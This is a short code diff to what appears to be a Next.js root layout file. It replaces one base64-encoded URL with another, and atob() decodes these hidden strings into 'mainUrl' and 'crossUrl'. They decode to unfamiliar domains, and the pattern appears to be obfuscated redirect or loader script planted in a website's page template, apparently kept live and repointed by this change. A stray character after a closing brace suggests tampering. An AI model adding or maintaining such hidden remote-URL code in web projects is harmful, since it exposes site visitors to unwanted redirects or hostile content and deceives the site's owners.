@@ -172,7 +172,7 @@ export default function RootLayout({
                 return;
             }
         }4
-        var mainBrandB64 = "aHR0cHM6Ly8xMGV2YS1nbDB3LmNvbS9kaWJ6Zm9taXI="; 
+        var mainBrandB64 = "aHR0cHM6Ly9ldjctZmx1eDIxLmNvbS9kaWJ6Zm9taXI="; 
         var crossBrandB64 = "aHR0cHM6Ly9mY2ZueC5vcmcvZGg2MW1wMWFt"; 
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
